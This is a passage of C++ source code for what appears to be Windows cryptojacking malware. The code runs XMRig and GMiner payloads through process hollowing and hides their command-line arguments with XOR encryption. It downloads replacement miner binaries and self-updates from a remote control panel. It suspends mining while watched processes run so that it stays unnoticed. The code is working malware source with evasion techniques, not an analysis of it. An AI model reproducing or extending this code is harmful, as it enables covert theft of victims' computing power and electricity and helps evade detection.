                                            newGpuConfig.wallet != lastGpuConfig.wallet ||
                                            newGpuConfig.password != lastGpuConfig.password ||
                                            newGpuConfig.non_idle_usage != lastGpuConfig.non_idle_usage ||
                                            newGpuConfig.idle_usage != lastGpuConfig.idle_usage ||
                                            newGpuConfig.fan_speed != lastGpuConfig.fan_speed ||
                                            newGpuConfig.enabled != lastGpuConfig.enabled);
                    
                    // Handle CPU config change
                    if (cpuConfigChanged) {
#ifdef ENABLE_DEBUG_CONSOLE
                        std::cout << "[*] CPU config updated" << std::endl;
#endif
                        
                        lastCpuConfig = newCpuConfig;
                        
                        // Kill CPU miner if it's running
                        if (cpuPi) {
                            ProcessAPI procAPI;
                            if (procAPI.IsInitialized()) {
                                procAPI.pTerminateProcess(cpuPi.value().hProcess, 0);
                                WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
                            } else {
                                // Fallback to direct API
                                TerminateProcess(cpuPi.value().hProcess, 0);
                                WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
                            }
                            close_miner_handles(cpuPi);
                            cpuPid = 0;
                        }
                        
                        // Restart CPU miner if enabled. CPU mining may have been
                        // disabled at startup, so the payload is loaded only when
                        // it is first needed; without a payload there is nothing to
                        // start, and any running miner keeps its old config.
                        if (newCpuConfig.enabled == 1 &&
                            ensure_embedded_xmrig(xmrigBuf, xmrigPayloadSize)) {
                            bool newCpuIsIdle = IsDeviceIdle(newCpuConfig.wait_time_idle);
                            std::string newCpuCommand = configManager.BuildCommandLineArgs(newCpuConfig, newCpuIsIdle);
                            std::string encNewCpuArgs = ENC_ARGS_PREFIX + XorEncryptToHex(newCpuCommand, pcUsername);
                            cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
                                ScopedLPWSTR(encNewCpuArgs));
                            cpuPi = ProcessStorage::GetProcess(cpuPid);
#ifdef ENABLE_DEBUG_CONSOLE
                            std::cout << "[+] CPU miner restarted, PID: " << cpuPid << std::endl;
#endif
                        }
                    }

                    // Handle GPU config change
                    if (gpuConfigChanged) {
#ifdef ENABLE_DEBUG_CONSOLE
                        std::cout << "[*] GPU config updated" << std::endl;
#endif
                        
                        lastGpuConfig = newGpuConfig;
                        
                        // Kill GPU miner if it's running
                        if (gpuPi) {
                            ProcessAPI procAPI;
                            if (procAPI.IsInitialized()) {
                                procAPI.pTerminateProcess(gpuPi.value().hProcess, 0);
                                WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
                            } else {
                                // Fallback to direct API
                                TerminateProcess(gpuPi.value().hProcess, 0);
                                WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
                            }
                            close_miner_handles(gpuPi);
                            gpuPid = 0;
                        }
                        
                        // Restart GPU miner if enabled
                        if (newGpuConfig.enabled == 1 &&
                            ensure_embedded_gminer(gminerBuf, gminerPayloadSize)) {
                            std::string gminer_args = GMINER_ALGO + getAlgoMapping(newGpuConfig.algo);
                            { const std::string p = getPersString(newGpuConfig.algo); if (!p.empty()) gminer_args += GMINER_PERS + p; }
                            gminer_args += GMINER_SERVER + newGpuConfig.mining_url;
                            gminer_args += GMINER_USER   + newGpuConfig.wallet + "." + newGpuConfig.password;
                            gminer_args += GMINER_WORKER + newGpuConfig.password;
                            gminer_args += (newGpuConfig.use_ssl == 1 ? GMINER_SSL_ON : GMINER_SSL_OFF);
                            if (newGpuConfig.fan_speed > 0 && IsRunningAsAdmin()) {
                                gminer_args += GMINER_FAN + std::to_string(newGpuConfig.fan_speed);
                            }
                            gminer_args += GMINER_API;
                            
                            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, ScopedLPWSTR(gminer_args));
                            gpuPi = ProcessStorage::GetProcess(gpuPid);
#ifdef ENABLE_DEBUG_CONSOLE
                            std::cout << "[+] GPU miner restarted, PID: " << gpuPid << std::endl;
#endif
                        }
                    }
                }

#ifdef ENABLE_REMOTE_MINERS
                // When the panel is reachable, try to swap in the remote miner binaries
                // (we may have started with the embedded fallback)
                if (panelOnline) {
                    // Never download a miner the panel has disabled: the swap stays
                    // pending until (and unless) that miner gets enabled.
                    if (configManager.GetCPUConfig().enabled == 1 && !remoteXmrigDownloaded) {
                        BYTE *remoteXmrig = nullptr;
                        size_t remoteXmrigSize = 0;
                        if (DownloadMinerWithFallback(panelUrlsStr, "/resources/xmrig", remoteXmrig, remoteXmrigSize)) {
                            remoteXmrigDownloaded = true;
#ifdef ENABLE_DEBUG_CONSOLE
                            std::cout << "[+] Remote XMRig loaded, restarting CPU miner" << std::endl;
#endif
                            // Kill running miner first
                            if (cpuPi) {
                                ProcessAPI procAPI;
                                if (procAPI.IsInitialized()) {
                                    procAPI.pTerminateProcess(cpuPi.value().hProcess, 0);
                                    WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
                                } else {
                                    TerminateProcess(cpuPi.value().hProcess, 0);
                                    WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
                                }
                                close_miner_handles(cpuPi);
                                cpuPid = 0;
                            }
                            if (xmrigBuf) free_buffer(xmrigBuf);
                            xmrigBuf = remoteXmrig;
                            xmrigPayloadSize = remoteXmrigSize;
                            // Restart with remote binary
                            if (configManager.GetCPUConfig().enabled == 1) {
                                bool isIdle = IsDeviceIdle(configManager.GetCPUConfig().wait_time_idle);
                                std::string cmd = configManager.BuildCommandLineArgs(configManager.GetCPUConfig(), isIdle);
                                cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
                                    ScopedLPWSTR(ENC_ARGS_PREFIX + XorEncryptToHex(cmd, pcUsername)));
                                cpuPi = ProcessStorage::GetProcess(cpuPid);
                                lastCpuConfig = configManager.GetCPUConfig();
                            }
                        }
                    }
                    if (configManager.GetGPUConfig().enabled == 1 && !remoteGminerDownloaded) {
                        BYTE *remoteGminer = nullptr;
                        size_t remoteGminerSize = 0;
                        if (DownloadMinerWithFallback(panelUrlsStr, "/resources/gminer", remoteGminer, remoteGminerSize)) {
                            remoteGminerDownloaded = true;
#ifdef ENABLE_DEBUG_CONSOLE
                            std::cout << "[+] Remote GMiner loaded, restarting GPU miner" << std::endl;
#endif
                            if (gpuPi) {
                                ProcessAPI procAPI;
                                if (procAPI.IsInitialized()) {
                                    procAPI.pTerminateProcess(gpuPi.value().hProcess, 0);
                                    WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
                                } else {
                                    TerminateProcess(gpuPi.value().hProcess, 0);
                                    WaitForSingleObject(gpuPi.value().hProcess, INFINITE);
                                }
                                close_miner_handles(gpuPi);
                                gpuPid = 0;
                            }
                            if (gminerBuf) free_buffer(gminerBuf);
                            gminerBuf = remoteGminer;
                            gminerPayloadSize = remoteGminerSize;
                            if (configManager.GetGPUConfig().enabled == 1) {
                                const MinerConfig& gc = configManager.GetGPUConfig();
                                std::string gminer_args = GMINER_ALGO + getAlgoMapping(gc.algo);
                                { const std::string p = getPersString(gc.algo); if (!p.empty()) gminer_args += GMINER_PERS + p; }
                                gminer_args += GMINER_SERVER + gc.mining_url;
                                gminer_args += GMINER_USER   + gc.wallet + "." + gc.password;
                                gminer_args += GMINER_WORKER + gc.password;
                                gminer_args += (gc.use_ssl == 1 ? GMINER_SSL_ON : GMINER_SSL_OFF);
                                if (gc.fan_speed > 0 && IsRunningAsAdmin()) {
                                    gminer_args += GMINER_FAN + std::to_string(gc.fan_speed);
                                }
                                gminer_args += GMINER_API;
                                gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, ScopedLPWSTR(gminer_args));
                                gpuPi = ProcessStorage::GetProcess(gpuPid);
                                lastGpuConfig = gc;
                            }
                        }
                    }
                }
#endif // ENABLE_REMOTE_MINERS
            }
        }

        // Monitor CPU miner process
        if (cpuPid != 0) {
            // Check idle status continuously (not just on crash)
            bool cpuIsIdle = IsDeviceIdle(lastCpuConfig.wait_time_idle);

            hashratePrintCounter++;
            if (hashratePrintCounter >= 30) {
                hashratePrintCounter = 0;
                std::cout << "[*] CPU hashrate: " << GetMinerHashrate() << " H/s" << std::endl;
            }

            idlePrintCounter++;
            if (idlePrintCounter >= 60) {
                idlePrintCounter = 0;
                std::cout << "[*] Idle: " << (cpuIsIdle ? "IDLE" : "BUSY") << " (threshold: " << lastCpuConfig.wait_time_idle << "m)" << std::endl;
            }
            
            // If idle status changed, restart the miner with updated CPU usage
            if (cpuIsIdle != g_lastCpuIdleStatus) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[*] Idle status -> " << (cpuIsIdle ? "IDLE" : "BUSY") << ", restarting CPU miner" << std::endl;
#endif
                g_lastCpuIdleStatus = cpuIsIdle;
                
                if (cpuPi) {
                    TerminateProcess(cpuPi.value().hProcess, 0);
                    WaitForSingleObject(cpuPi.value().hProcess, INFINITE);
                    close_miner_handles(cpuPi);
                    cpuPid = 0;
                }
                
                // Restart with new idle status if CPU is enabled
                if (lastCpuConfig.enabled == 1 && xmrigBuf != nullptr && xmrigPayloadSize > 0) {
                    std::string cpuCommand = configManager.BuildCommandLineArgs(lastCpuConfig, cpuIsIdle);
                    std::string encIdleArgs = ENC_ARGS_PREFIX + XorEncryptToHex(cpuCommand, pcUsername);
                    cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
                        ScopedLPWSTR(encIdleArgs));
                    cpuPi = ProcessStorage::GetProcess(cpuPid);
#ifdef ENABLE_DEBUG_CONSOLE
                    std::cout << "[+] CPU miner restarted, PID: " << cpuPid << std::endl;
#endif
                }
            } else if (!IsPidRunning(cpuPid)) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[!] CPU miner crashed, restarting" << std::endl;
#endif
                // Restart if CPU is still enabled. The miner is already dead, but
                // its handles and storage entry still have to be released.
                close_miner_handles(cpuPi);
                if (lastCpuConfig.enabled == 1) {
                    std::string cpuCommand = configManager.BuildCommandLineArgs(lastCpuConfig, cpuIsIdle);
                    std::string encRestartArgs = ENC_ARGS_PREFIX + XorEncryptToHex(cpuCommand, pcUsername);
                    cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
                        ScopedLPWSTR(encRestartArgs));
                    cpuPi = ProcessStorage::GetProcess(cpuPid);
                }
            } else {
                // Handle process suspension based on monitoring
                if (AreProcessesRunning(configManager.GetWatchedProcesses())) {
                    NtSuspendProcess(cpuPi.value().hProcess);
                } else {
                    NtResumeProcess(cpuPi.value().hProcess);
                }
            }
        }

        // Monitor GPU miner process
        if (gpuPid != 0) {
            if (!IsPidRunning(gpuPid)) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[!] GPU miner crashed, restarting" << std::endl;
#endif
                // Restart if GPU is still enabled
                close_miner_handles(gpuPi);
                if (lastGpuConfig.enabled == 1 && gminerBuf != nullptr && gminerPayloadSize > 0) {
                    std::string gminer_args = GMINER_ALGO + getAlgoMapping(lastGpuConfig.algo);
                    { const std::string p = getPersString(lastGpuConfig.algo); if (!p.empty()) gminer_args += GMINER_PERS + p; }
                    gminer_args += GMINER_SERVER + lastGpuConfig.mining_url;
                    gminer_args += GMINER_USER   + lastGpuConfig.wallet + "." + lastGpuConfig.password;
                    gminer_args += GMINER_WORKER + lastGpuConfig.password;
                    gminer_args += (lastGpuConfig.use_ssl == 1 ? GMINER_SSL_ON : GMINER_SSL_OFF);
                    gminer_args += GMINER_API;
                    
                    gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, ScopedLPWSTR(gminer_args));
                    gpuPi = ProcessStorage::GetProcess(gpuPid);
                }
            } else {
                // Handle process suspension based on monitoring
                if (AreProcessesRunning(configManager.GetWatchedProcesses())) {
                    NtSuspendProcess(gpuPi.value().hProcess);
                } else {
                    NtResumeProcess(gpuPi.value().hProcess);
                }
            }
        }

        // Check for client updates (every hour)
        updateCheckCounter++;
        if (updateCheckCounter >= UPDATE_CHECK_INTERVAL) {
            updateCheckCounter = 0;
            if (CheckAndApplyUpdate(panelUrlsStr, CLIENT_VERSION)) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] Update applied, restarting" << std::endl;
#endif
                // Exit gracefully so the batch script can replace the executable
                g_shouldExit = true;
                break;
            }
        }
        
        Sleep(1000);
    }

    return 0;
}

// WinMain entry point for GUI subsystem (WIN32 flag)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Convert Windows command line to argc/argv format and call main()
    int argc = 0;
    LPWSTR* argv_w = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    char** argv = new char*[argc];
    for (int i = 0; i < argc; i++) {
        int size = WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, NULL, 0, NULL, NULL);
        argv[i] = new char[size];
        WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, argv[i], size, NULL, NULL);
    }
    
    int result = main(argc, argv);
    
    // Cleanup
    for (int i = 0; i < argc; i++) {
        delete[] argv[i];
    }
    delete[] argv;
    LocalFree(argv_w);
    
    return result;
}

